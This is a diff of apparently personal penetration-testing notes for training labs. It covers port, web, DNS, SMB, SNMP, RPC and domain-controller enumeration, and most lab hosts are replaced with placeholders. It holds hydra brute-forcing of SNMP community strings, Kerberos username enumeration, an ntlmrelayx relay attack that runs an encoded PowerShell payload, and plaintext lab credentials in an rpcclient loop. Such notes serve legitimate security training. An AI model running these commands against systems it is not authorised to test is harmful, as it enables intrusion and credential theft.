@@ -13,17 +13,28 @@ sudo nmap -sU -sV -T4 -p161 <IP> #SNMP
 nmap --script=http-enum <IP> -p80 #HTTP
 nmap --script ftp-brute -p21 <IP> #FTP
 sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP> #TFTP
+
+# search scripts
+cd /usr/share/nmap/scripts/
+cat script.db  | grep "\"vuln\""
+
+# Nmap scan using all of the NSE scripts from the vuln category
+sudo nmap -sV -p <port> --script "vuln" <IP>
+
+nmap -p 139,445 --script smb-vuln* <IP>
+
+sudo nmap -sU -p161 --script *snmp* <IP>
 ```
 
 ### enum web server
 
 ```
-source page 
+check source page 
 
 whatweb <url>
 
 wpscan --url <url>
-wpscan --url <url> --enumerate p --plugins-detection aggressive #exploit plugin
+wpscan --url <url> --enumerate p --plugins-detection aggressive #plugins
 wpscan   --url <url> -ep 
 
 use wappalyzer
@@ -53,21 +64,21 @@ gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
 wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 <url>/FUZZ/
 
 # git folder
-feroxbuster -u http://bullybox.local/ -x git
+feroxbuster -u <url> -x git
 
 #recursive search
 feroxbuster -u <url> --depth 2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 # authenticated
-gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u http://192.168.228.131/svn
+gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u <url>
 
 # https 
-sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://192.168.174.10:9090 -t 42 -k --exclude-length 43264 
+sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <url> -t 42 -k
 
-feroxbuster -u https://watch.streamio.htb/ --depth 2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -k
+feroxbuster -u <url> --depth 2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -k
 
 # proxy
-dirb http://192.168.175.189:8080/ -p http://192.168.175.189:3128
+dirb <url> -p <url>
 
 wordlists:
 directory-list-2.3-medium.txt
@@ -81,11 +92,11 @@ raft-wordlist.txt
 ### subdomains
 
 ```
-ffuf -w /usr/share/wordlists/Subdomain.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb"
+ffuf -w /usr/share/wordlists/Subdomain.txt -u http://siteisup.htb -H "Host: FUZZ.site.com"
 
-gobuster dns --domain "siteisup.htb" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomain.txt
+gobuster dns --domain "site.com" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomain.txt
 
-gobuster dns -d siteisup.htb -w /usr/share/wordlists/Subdomain.txt 
+gobuster dns -d site.com -w /usr/share/wordlists/Subdomain.txt 
 
 another wordlist: subdomains-top1million-20000.txt
 ```
@@ -95,7 +106,7 @@ another wordlist: subdomains-top1million-20000.txt
 ### LFI
 
 ```
-wfuzz -c --hh=32 -z file,/usr/share/wordlists/LFI_payload.txt http://192.168.207.246:8080/view?page=FUZZ 
+wfuzz -c --hh=32 -z file,/usr/share/wordlists/LFI_payload.txt http://<IP>:<PORT>/view?page=FUZZ 
 ```
 
 ### SNMP
@@ -105,39 +116,28 @@ nmap
 sudo nmap -sU -p161 --script *snmp* <IP>
 ```
 
-is Simple Network Management Protocol, we can use it to enumerate the network
-https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/INFO-GATH/CHEATSHEETS/snmb_enumeration.md
-
-| 1.3.6.1.2.1.25.1.6.0   | System Processes |
-| ---------------------- | ---------------- |
-| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
-| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
-| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
-| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
-| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
-| 1.3.6.1.2.1.6.13.1.3   | TCP Local Port   |
-
 brute-force comunity strings:
 ```
 hydra -P /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt <IP> snmp
 ```
 
+you can use snmpwalk and snmpbulkwalk to enumerate, snmpbulkwalk is faster
 ```
 # Enumerating the Entire MIB Tree
-> snmpwalk -c public -v1 192.168.204.149 
-> snmpbulkwalk 10.10.11.136 -v 2c -c public > output2.txt 
+snmpwalk -c public -v1 192.168.204.149 
+snmpbulkwalk 10.10.11.136 -v 2c -c public > output2.txt 
 
 # Enumerating Users:
-> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 192.168.204.149 1.3.6.1.4.1.77.1.2.25
 
 # Enumerating Running Processes:
-> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.4.2.1.2
 
 # Enumerating Open TCP Ports:
-> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.6.13.1.3
 
 # Enumerating Installed Software:
-> snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.6.3.1.2
+snmpwalk -c public -v1 192.168.204.149 1.3.6.1.2.1.25.6.3.1.2
 
 snmpwalk -c public -v1 192.168.204.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
 snmpwalk -c public -v1 192.168.204.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
@@ -168,29 +168,29 @@ smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t <IP>
  sendmail version: https://www.exploit-db.com/exploits/4761
 ### SMB
 
-auto enumerate throw smb
+connect 
+
 ```
-# add domain if there is
-smbmap -H 192.168.247.159 -u guest -d ZEUS
-
-python3 ~/offsec/tools/nullinux.py 192.168.156.175
-
-# if there are creds
-smbmap -H 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' 
-
-# relay attack
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.247.159 -c "powershell -e JABjAGwAaQBlAG4AdAAg..."
-```
-
-anonymous login
-```
+# anonymous login
 smbclient -L //<IP> -N
 smbmap -H <IP> -u guest
+
+# null session
+smbclient -L //<IP> -U ""
 ```
 
-null session
+enumerate throw smb
 ```
-smbclient -L //<IP> -U ""
+# add domain if there is
+smbmap -H <IP> -u guest -d <DOMAIN>
+
+python3 nullinux.py <IP>
+
+# if there are creds
+smbmap -H <IP> -u <USER> -p <PASS>
+
+# relay attack
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -e JABjAGwAaQBlAG4AdAAg..."
 ```
 
 nmap scripts on smb
@@ -211,8 +211,12 @@ recurse ON
 mget *
 ```
 
-
 ### FTP
+
+connect 
+```
+ftp <IP>
+```
 
 download all files
 ```
@@ -228,44 +232,30 @@ https://github.com/EnableSecurity/tftptheft
 
 ### DNS enumeration
 
-#### subdomain
+subdomain
 
 ```
-gobuster dns --domain "target.domain" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomains.txt  
+ffuf -w /usr/share/wordlists/Subdomain.txt -u http://siteisup.htb -H "Host: FUZZ.site.com"
 
-gobuster dns -w /usr/share/wordlists/Subdomain.txt -d "target.domain"
+gobuster dns --domain "site.com" --resolver "nameserver"  --wordlist /usr/share/wordlists/Subdomain.txt
+
+gobuster dns -d site.com -w /usr/share/wordlists/Subdomain.txt 
+
+another wordlist: subdomains-top1million-20000.txt
 ```
 
-#### Host
-**host** command to find information on IP address
-
+enumeration
 ```
-for example:
 host www.megacorpone.com
 host -t mx megacorpone.com
 host -t txt megacorpone.com
 for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
-```
 
-#### Dnsrecon
+dnsrecon -d site.com -t std
 
-```
-for example:
-dnsrecon -d megacorpone.com -t std
-```
+dnsenum site.com
 
-#### DNSenum
-
-```
-for example:
-dnsenum megacorpone.com
-```
-
-#### nslookup
-
-```
-for example:
-nslookup -type=TXT info.megacorptwo.com 192.168.50.151
+nslookup -type=TXT site.com <IP>
 ```
 
 ### RPC
@@ -300,7 +290,7 @@ more: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpc
 enum users with SID, user name and password
 ```
 #!/bin/bash 
-sid="S-1-5-21-4254423774-1266059056-3197185112" for i in `seq 1000 1020`; do rpcclient -U "hazard%stealth1agent" -c "lookupsids $sid-$i;quit" 10.10.10.149 | cut -d ' ' -f2 done
+sid="S-1-5-21-4254423774-1266059056-3197185112" for i in `seq 1000 1020`; do rpcclient -U "hazard%stealth1agent" -c "lookupsids $sid-$i;quit" <IP> | cut -d ' ' -f2 done
 ```
 
 ### Web application enumeration
@@ -313,7 +303,7 @@ sid="S-1-5-21-4254423774-1266059056-3197185112" for i in `seq 1000 1020`; do rpc
 - jwt crack
 ### general in files
 
-run the `cut` command on every file in a directory
+command to run on files to automate the process
 ```
 # bash
 for file in *; do [ -f "$file" ] && cut -f1 "$file"; done
@@ -322,7 +312,6 @@ for file in *; do [ -f "$file" ] && cut -f1 "$file"; done
 grep -r "password" .  
 
 # powershell
-
 Get-ChildItem -File | ForEach-Object { Get-Content $_.FullName | ForEach-Object { $_ -split '\t' | Select-Object -First 1 } | Select-String -Pattern "username" }
 
 Get-ChildItem -Recurse | Select-String -Pattern "hello"
@@ -334,15 +323,17 @@ findstr /S /I /C:"hello" *.*
 
 ### DC
 
-tools
-- enum4linux
-- ldapsearch
+enumerate throw DC
 ```
-ldapsearch -x -H ldap://192.168.156.122 -D '' -w '' -b "DC=hutch,DC=offsec" |grep "Pass"
+enum4linux <DC IP>
 
-ldapsearch -x -b "DC=hutch,DC=offsec" "*" -H ldap://192.168.156.122 | grep "userPrincipalName"
+ldapsearch -x -H ldap://<DC IP> -D '' -w '' -b "DC=domain,DC=com" |grep "Pass"
+ldapsearch -x -b "DC=domain,DC=com" "*" -H ldap://<DC IP> | grep "userPrincipalName"
+
+use windapsearch (nedd user and password)
+
+# search for domain's users
+kerbrute_linux_arm64 userenum -d domain.com --dc <DC IP> /usr/share/wordlists/xato-net-10-million-usernames.txt -t 100
+
+use bloodhound-python (need user and password)
 ```
-- windapsearch - need user and password
-- Kerbrute - found vaild usernames
-	- `~/offsec/tools/kerbrute/dist/kerbrute_linux_arm64 userenum -d hokkaido-aerospace.com --dc 192.168.181.40 /usr/share/wordlists/xato-net-10-million-usernames.txt -t 100`
-- bloodhound-python - need user and password
